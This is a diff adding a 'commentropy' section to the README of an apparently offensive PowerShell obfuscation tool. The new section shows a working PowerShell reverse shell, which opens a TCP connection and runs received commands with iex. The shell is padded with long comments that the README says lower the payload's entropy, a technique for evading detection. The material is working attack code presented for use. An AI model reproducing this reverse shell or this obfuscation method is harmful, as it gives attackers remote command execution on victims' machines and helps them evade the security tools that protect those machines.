@@ -58,6 +58,15 @@ PS C:\auto_powershell_obfuscation> python .\obfuscator.py -m gcm -f .\payload.tx
 
 ```
 
+### Commentropy
+
+**commentropy** mode creates long comments in your payload and reduces the entropy of your payload.
+
+```powershell
+PS C:\auto_powershell_obfuscation> python .\obfuscator.py -f .\payload.txt -m commentropy
+$client <#*********************************#>=<#*******************************#> New-Object System.Net.Sockets.TCPClient('127.0.0.1',8181);$stream <#*********************************#>=<#*******************************#> $client.GetStream();[byte[]]$bytes <#*********************************#>=<#*******************************#> 0..65535|%{0};while(($i <#*********************************#>=<#*******************************#> $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data <#*********************************#>=<#*******************************#> (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback <#*********************************#>=<#*******************************#> (iex $data 2>&1 | Out-String );$sendback2 <#*********************************#>=<#*******************************#> $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte <#*********************************#>=<#*******************************#> ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
 ### Entropy
 
 **entropy** mode allows you to calculate the entropy of your payload.
